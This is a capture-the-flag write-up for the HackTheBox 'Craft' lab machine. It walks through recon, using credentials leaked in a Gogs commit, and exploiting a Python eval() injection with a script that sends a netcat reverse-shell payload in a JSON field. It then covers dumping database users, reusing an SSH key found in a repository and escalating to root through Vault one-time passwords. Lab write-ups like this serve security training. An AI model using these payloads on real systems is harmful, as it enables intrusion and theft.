## HackTheBox Machine
![alt text](/Machine_Labs/Craft/Images/image.png)

### Link: https://app.hackthebox.com/machines/Craft
-------------------------------------------------------

### RECON:
+ Scan the open port in the machine:

```bash
$ nmap -sV -vv -A -T4 -p- craft.htb
PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)

443/tcp  open  ssl/http syn-ack nginx 1.15.8
|_http-server-header: nginx/1.15.8
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Issuer: commonName=Craft CA/organizationName=Craft/stateOrProvinceName=New York/countryName=US/emailAddress=admin@craft.htb/localityName=Buffalo/organizationalUnitName=Craft
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-02-06T02:25:47
| Not valid after:  2020-06-20T02:25:47
| MD5:   0111:76e2:83c8:0f26:50e7:56e4:ce16:4766
| SHA-1: 2e11:62ef:4d2e:366f:196a:51f0:c5ca:b8ce:8592:3730
6022/tcp open  ssh      syn-ack (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDU+fEcb0HbuFvUiMce89AuwclFwGQAJ/FSk+X/uPL+08lP9AzNCivAovV8Py3XEGfUhSDQeJ6Xw5aZCIZB7z/40IViSC1S1fe49lmv7TlDSFKEOZIDQIAuDP3giwyrdX0MnM5qrFtqs9lIH0D8MnGVCh3kcjG5Mh+Jb4/fcGkIpLSAyVc2Fm5PFFV0XIay5vv/SffCO1141JHFZj+Sal4t4MmlZiY1RTaAgGLsn1SshS2EYFv91rZqHmmNCk+GNVSU9txRQm3OrB+06QTsOWnYN71p6+hTe/TQjhaE53zM+/xZi7sPIq6l6evvNSMOOt9fgVQkvM2NuVutLiq6od2h
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go
```

### Exploit Gogs service:
+ Access the main page `craft.htb`, we've found the `API` and Git service `Gogs`.
+ Go each page one by one, we've found some interesting things. In the page `Gogs`, we saw the repo `craft-api` with developers.
+ Looking around account of developers, we've found the commit of user `dinesh` about the bug of API:

![alt text](/Machine_Labs/Craft/Images/image-1.png)

--> We found the dinesh user's password for the API: `'dinesh', '4aUh0A8PbVJxgd'`.

+ We can use the credential to login API:

![alt text](/Machine_Labs/Craft/Images/image-2.png)

--> Get the token to login. We can use it to check later.

![alt text](/Machine_Labs/Craft/Images/image-4.png)

![alt text](/Machine_Labs/Craft/Images/image-5.png)

+ Back to the first commit, we check the source code `brew.py`:

```bash
 # make sure the ABV value is sane.
        if eval('%s > 1' % request.json['abv']):
            return "ABV must be a decimal value less than 1.0", 400
        else:
            create_brew(request.json)
            return None, 201
```

--> We've found the vulnerability in `eval()`, we can inject the payload into function to spawn reverse shell.

***Note:*** `eval()` - function evaluates the specified expression, if the expression is a legal Python statement, it will be executed:

```python
>>> eval("2 + 2")
4
>>> eval("__import__ ('os').system('whoami')")
zicco
0
```

+ Access `/craft-api/tests/test.py`, we see the source code and func `eval()` in brew.py that we will manipulate the parameter `abv` to inject the payload when execute `test.py` to create a new brew entry.
+ Download `test.py` to the attack machine and edit the file to run it:

```python
#!/usr/bin/env python

import requests
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']

headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }

# make sure token is valid
response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
print(response.text)


# create a sample brew with real ABV... should succeed.
print("Create real ABV brew")
brew_dict = {}
brew_dict['abv'] = "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 >/tmp/f')"
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
```

***Note***: We add `urllib3`:
```
import urllib3 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
```
to disable the error certification

+ Now run file test.py and open netcat to capture the shell:

![alt text](/Machine_Labs/Craft/Images/image-6.png)

![alt text](/Machine_Labs/Craft/Images/image-7.png)

### Finding SSH credenials through Mysql database:
+ In the file `settings.py`, we found the credential user of database:

![alt text](/Machine_Labs/Craft/Images/image-8.png)

--> We've had `User`, `Password`, `DB`, `Host`.

+ Back again the repo `craf-api`, we've check python file `dbtest.py`. We are able to run file .py in the target machine to extract the information of database.
+ Firstly, we will wget file .py in target machine and edit again `dbtest.py`.

```bash
$ sudo python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.14.5 - - [09/Mar/2025 14:27:13] "GET / HTTP/1.1" 200 -
10.10.14.5 - - [09/Mar/2025 14:27:13] code 404, message File not found
10.10.14.5 - - [09/Mar/2025 14:27:13] "GET /favicon.ico HTTP/1.1" 404 -
10.10.10.110 - - [09/Mar/2025 14:27:22] "GET /dbtest.py HTTP/1.1" 200 -
```

![alt text](/Machine_Labs/Craft/Images/image-9.png)

+ We can check file edited:
```python
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = "show tables" # Edit query sql to execute which we want
        cursor.execute(sql)
        result = cursor.fetchall()
        print(result)

finally:
    connection.close()
```
***Note***: Because import `pymysql` we can use `fetchall()` - Fetch all the rows. Searching more relate class `pymysql` in [here](https://pymysql.readthedocs.io/en/latest/modules/cursors.html).

+ Run `dbtest.py`:

![alt text](/Machine_Labs/Craft/Images/image-10.png)

+ Now we change query to extract users:

```python
 with connection.cursor() as cursor:
        sql = "SELECT * FROM user"
        cursor.execute(sql)
        result = cursor.fetchall()
        print(result)
```

+ Run `dbtest.py` again:

![alt text](/Machine_Labs/Craft/Images/image-11.png)

--> We use the credential user `gilfoyle` to login git service `gogs`.

+ Login `gogs` we found the gilfoyle's repo name `craft-infra`.
+ Check repo we had key .ssh/id_rsa to login SSH. Save key to machine and login SSH.

![alt text](/Machine_Labs/Craft/Images/image-12.png)

### Privilege Escalation:
+ Check again repo `craft-infra`, we've checked secret file `secrets.sh` in /vault.
+ Read it and we guess we can use it to privilege escalation.

![alt text](/Machine_Labs/Craft/Images/image-13.png)

+ Research about `vault` and `ssh`, we found the way call `One-time SSH passwords`. [Read it!!!](https://developer.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords).

+ We run following `Automate it!` to create a new OTP and invoke SSH with the correct parameters to connect to the host.

+ Run CLI and we get the root:

![alt text](/Machine_Labs/Craft/Images/image-14.png)
-----------------------------------------------------------